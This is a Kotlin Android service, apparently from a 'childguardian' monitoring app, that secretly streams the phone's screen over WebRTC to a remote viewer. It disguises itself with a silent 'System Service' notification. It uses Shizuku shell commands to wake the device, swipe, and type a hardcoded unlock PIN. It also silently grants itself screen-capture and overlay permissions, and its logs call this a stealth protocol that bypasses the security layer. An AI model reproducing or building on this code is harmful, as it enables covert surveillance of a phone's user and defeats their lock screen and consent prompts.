package com.childguardian.services.screen

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.childguardian.MainActivity
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.webrtc.WebRTCManager
import dagger.hilt.android.AndroidEntryPoint
import org.json.JSONObject
import org.webrtc.*
import timber.log.Timber
import javax.inject.Inject
import android.content.Context

@AndroidEntryPoint
class ScreenCaptureService : Service() {

    @Inject lateinit var webRTCManager: WebRTCManager
    @Inject lateinit var socketManager: SocketManager
    @Inject lateinit var mediaProjectionHolder: MediaProjectionHolder

    private var viewerId: String? = null
    private var isStreaming = false
    private var lastStreamRequestTime = 0L

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        // No startForeground here! Prevents Android 14 instant crash.
        Timber.d("ScreenCaptureService created")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("screen_capture_channel", "System Service", NotificationManager.IMPORTANCE_LOW).apply {
                setSound(null, null)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "screen_capture_channel")
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        when (intent?.action) {
            "ACTION_SAVE_TICKET" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(1001, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                } else {
                    startForeground(1001, createNotification())
                }

                val code = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED)
                val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra("DATA", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION") intent.getParcelableExtra("DATA")
                }

                if (data != null) {
                    mediaProjectionHolder.saveTicket(code, data)
                    Timber.d(">>> Ticket successfully saved to Vault! <<<")

                    // THE FIX: Only ignite the engine if the Mac has actually sent a Viewer ID!
                    if (viewerId != null && !isStreaming) {
                        Timber.d(">>> Mac is waiting! Igniting WebRTC Engine... <<<")
                        isStreaming = true
                        setupSignalingListeners()
                        webRTCManager.startCapture(mediaProjectionHolder.permissionIntent!!, 720, 1280)
                        setupWebRTC()
                    } else {
                        Timber.d(">>> Ticket stored safely. Waiting for Mac to request a stream... <<<")
                    }
                }
            }

            "ACTION_START_STREAM" -> {
                val incomingViewerId = intent.getStringExtra("VIEWER_ID")
                val now = System.currentTimeMillis()

                // 1. THE HARD DEBOUNCER: Ignore ANY request if we just received one less than 3 seconds ago!
                if (now - lastStreamRequestTime < 3000) {
                    Timber.d(">>> Ignoring rapid-fire duplicate request from Mac. <<<")
                    return START_STICKY
                }
                lastStreamRequestTime = now

                // 2. THE REFRESH FIX: If the Mac refreshed (new ID), reset the engine
                if (isStreaming && viewerId != incomingViewerId) {
                    Timber.d(">>> Page refresh detected! Resetting engine for new session... <<<")
                    isStreaming = false

                    // THE FIX: We MUST explicitly kill the old hardware surface before making a new one!
                    // Call whatever method you use to shut down your WebRTC engine here:
                    try {
                        webRTCManager.stop() // (Or .stop(), .onDestroy(), etc. depending on your class)
                    } catch (e: Exception) {
                        Timber.e("Error shutting down old engine: ${e.message}")
                    }

                    // Clear the dead ticket from the vault so we are forced to get a fresh one
                    mediaProjectionHolder.clear()
                }


                // 3. THE FREEZE FIX: Ignore duplicate requests from the SAME session
                if (isStreaming && viewerId == incomingViewerId) {
                    Timber.d(">>> Already streaming to this Mac! Ignoring duplicate request. <<<")
                    return START_STICKY
                }

                viewerId = incomingViewerId
                Timber.d(">>> STREAM REQUESTED! Activating Hybrid Stealth Protocol... <<<")

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(1001, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                } else {
                    startForeground(1001, createNotification())
                }

                // 4. Unlock Sequence & ADB Launch
                Thread {
                    if (com.childguardian.services.ShizukuManager.hasShizukuPermission()) {
                        Timber.d(">>> SHIZUKU: Executing Smart Unlock Sequence... <<<")

                        val powerManager = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                        val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager

                        // A. Wake screen if OFF
                        if (!powerManager.isInteractive) {
                            Timber.d(">>> Screen is OFF. Waking it up... <<<")
                            com.childguardian.services.ShizukuManager.runShellCommand("input keyevent 224")
                            Thread.sleep(500)
                        }

                        // B. Swipe and PIN if LOCKED
                        if (keyguardManager.isKeyguardLocked) {
                            Timber.d(">>> Phone is LOCKED. Executing Swipe and PIN... <<<")
                            com.childguardian.services.ShizukuManager.runShellCommand("input swipe 500 1500 500 300 500")
                            Thread.sleep(1000)

                            val phonePin = "0801"
                            com.childguardian.services.ShizukuManager.runShellCommand("input text $phonePin")
                            Thread.sleep(300)
                            com.childguardian.services.ShizukuManager.runShellCommand("input keyevent 66")
                            Thread.sleep(1500)
                        } else {
                            Timber.d(">>> Phone is already UNLOCKED. Skipping PIN entry! <<<")
                        }

                        // C. Grant AppOps silently
                        val pkg = packageName
                        com.childguardian.services.ShizukuManager.runShellCommand("appops set $pkg PROJECT_MEDIA allow")
                        com.childguardian.services.ShizukuManager.runShellCommand("appops set $pkg SYSTEM_ALERT_WINDOW allow")
                        Timber.d(">>> SHIZUKU: Security layer completely bypassed. <<<")
                    }

                    // 5. THE ADB GOD-MODE WAKEUP
                    // We MUST fetch a brand new ticket every time. Android 14 blocks reused tickets!
                    Timber.d(">>> Waking MainActivity via Root ADB to fetch fresh invisible ticket... <<<")

                    val activityPath = "$packageName/com.childguardian.MainActivity"
                    com.childguardian.services.ShizukuManager.runShellCommand("am start -n $activityPath --ez REMOTE_TRIGGER true")

                }.start()
            }
        }
        return START_STICKY
    }

    private fun setupSignalingListeners() {
        socketManager.on("answer") { args ->
            if (args.isNotEmpty()) {
                try {
                    val answerSdp = (args[0] as JSONObject).getJSONObject("answer")
                    webRTCManager.setRemoteDescription(SessionDescription(
                        SessionDescription.Type.fromCanonicalForm(answerSdp.getString("type")),
                        answerSdp.getString("sdp")
                    ))
                } catch (e: Exception) {}
            }
        }

        socketManager.on("ice-candidate") { args ->
            if (args.isNotEmpty()) {
                try {
                    val data = args[0] as JSONObject
                    val candidateData = data.getJSONObject("candidate")
                    val sdpString = if (candidateData.has("candidate")) candidateData.getString("candidate") else candidateData.getString("sdp")
                    webRTCManager.addIceCandidate(IceCandidate(
                        candidateData.getString("sdpMid"),
                        candidateData.getInt("sdpMLineIndex"),
                        sdpString
                    ))
                } catch (e: Exception) {}
            }
        }

        socketManager.on(io.socket.client.Socket.EVENT_DISCONNECT) { handleDisconnect() }
    }

    private fun setupWebRTC() {
        val iceServers = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())

        webRTCManager.createPeerConnection(iceServers, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionReceivingChange(b: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dataChannel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}

            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                if (state == PeerConnection.IceConnectionState.DISCONNECTED ||
                    state == PeerConnection.IceConnectionState.FAILED ||
                    state == PeerConnection.IceConnectionState.CLOSED) {
                    handleDisconnect()
                }
            }

            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    val candidateJson = JSONObject().apply {
                        put("viewerId", viewerId)
                        put("targetId", viewerId)
                        put("candidate", JSONObject().apply {
                            put("sdpMid", it.sdpMid)
                            put("sdpMLineIndex", it.sdpMLineIndex)
                            put("sdp", it.sdp)
                        })
                    }
                    socketManager.emit("ice-candidate", candidateJson)
                }
            }
        })

        webRTCManager.addVideoTrack()

        webRTCManager.onSessionDescription = { sdp ->
            val offerJson = JSONObject().apply {
                put("viewerId", viewerId)
                put("targetId", viewerId)
                put("offer", JSONObject().apply {
                    put("type", sdp.type.canonicalForm())
                    put("sdp", sdp.description)
                })
            }
            socketManager.emit("offer", offerJson)
        }
        webRTCManager.createOffer()
    }

    private fun handleDisconnect() {
        if (isStreaming) {
            isStreaming = false
            webRTCManager.stop()
            mediaProjectionHolder.clear()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        socketManager.off("answer")
        socketManager.off("ice-candidate")
        socketManager.off(io.socket.client.Socket.EVENT_DISCONNECT)
        webRTCManager.stop()
        isStreaming = false
    }

    override fun onBind(intent: Intent?): IBinder? = null
}